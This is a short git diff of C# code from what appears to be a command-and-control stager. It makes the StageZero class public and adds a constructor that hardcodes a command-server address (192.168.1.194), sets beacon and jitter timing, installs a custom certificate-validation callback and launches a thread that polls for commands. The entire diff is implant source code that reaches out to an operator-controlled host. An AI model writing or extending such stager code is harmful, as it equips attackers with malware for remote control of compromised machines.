@@ -14,7 +14,7 @@ using Reno.Comm;
 
 namespace Stager
 {
-    class StageZero : IStageZero
+    public class StageZero : IStageZero
     {
         List<Uri> commandUriList;
         int beacon, jitter;
@@ -36,6 +36,18 @@ namespace Stager
                 mainThread = new Thread(new ThreadStart(Run));
                 mainThread.Start();
             }  
+        }
+
+        public StageZero(int beacon, int jitter)
+        {
+            commandUriList = new List<Uri>();
+            commandUriList.Add(new Uri("http://192.168.1.194"));
+            this.beacon = beacon;
+            this.jitter = jitter;
+            System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12 | System.Net.SecurityProtocolType.Tls11;
+            System.Net.ServicePointManager.ServerCertificateValidationCallback = ValidateServerCertificate;
+            mainThread = new Thread(new ThreadStart(Run));
+            mainThread.Start();
         }
         /// <summary>
         /// This method adds a Uri to the list of Uri's to reach out to for finding commands
